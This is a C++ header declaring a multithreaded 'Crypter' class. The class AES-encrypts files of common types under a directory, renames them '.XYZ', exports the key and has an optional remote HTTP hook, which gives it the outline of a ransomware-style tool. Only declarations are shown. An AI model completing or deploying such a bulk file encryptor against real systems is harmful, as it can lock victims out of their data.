#ifndef LETSCODE_CRYPTER_H
#define LETSCODE_CRYPTER_H

#include <string>
#include <fstream>
#include <iostream>
#include <vector>
#include <algorithm>
#include <thread>
#include <filesystem>

using std::thread;
using std::string;
using std::cout;
using std::cerr;
using std::endl;
using std::vector;
using std::fstream;
using std::find;
namespace fs = std::filesystem;

#include "cryptopp/osrng.h"
#include "cryptopp/cryptlib.h"
#include "cryptopp/hex.h"
#include "cryptopp/filters.h"
#include "cryptopp/aes.h"
#include "cryptopp/ccm.h"

using CryptoPP::AutoSeededRandomPool;
using CryptoPP::AES;
using CryptoPP::StringSink;
using CryptoPP::StringSource;
using CryptoPP::StreamTransformationFilter;
using CryptoPP::StreamTransformation;
using CryptoPP::CBC_Mode;
using CryptoPP::HexEncoder;
using CryptoPP::HexDecoder;
using CryptoPP::BlockPaddingSchemeDef;

#define REMOTE 0

#if REMOTE
#include <httplib.h>
#endif

class Crypter
{
private:
    const string _entry_dir = "/home/ernestas/stuff/CLionProjects/letscode/test";
    const vector<string> _extentions{".pdf", ".txt", ".py", ".cpp", ".aes", ".XYZ"};
    std::atomic<long long> _current_file_index = -1;

    static const int _KEY_LENGTH = AES::MAX_KEYLENGTH;
    static const int _BLOCK_SIZE = AES::BLOCKSIZE;
    static const long _BUFFER_SIZE = 16 * 1024;
    const string _EXTENSION = ".XYZ";
    const size_t _EXT_LENGTH = _EXTENSION.length();
    static const int _THREAD_NUM = 10;

    CryptoPP::byte _key[_KEY_LENGTH];
    CryptoPP::byte _iv[_BLOCK_SIZE];

public:
    enum status : int
    {
        FAILED = 0,
        SUCCESS = 1,
        OPEN_ERR = 2,
        MOVE_ERR = 3
    };

public:
    Crypter();

    Crypter(const string &key, const string &iv);

    int letsGO();

    int encrypt(const string &file);

    int decrypt(const string &file);

    vector<string> loadFiles();

    string beautifulKey();

    string beautifulIV();

    static string unbeautify(const string &encoded);
};


#endif //LETSCODE_CRYPTER_H
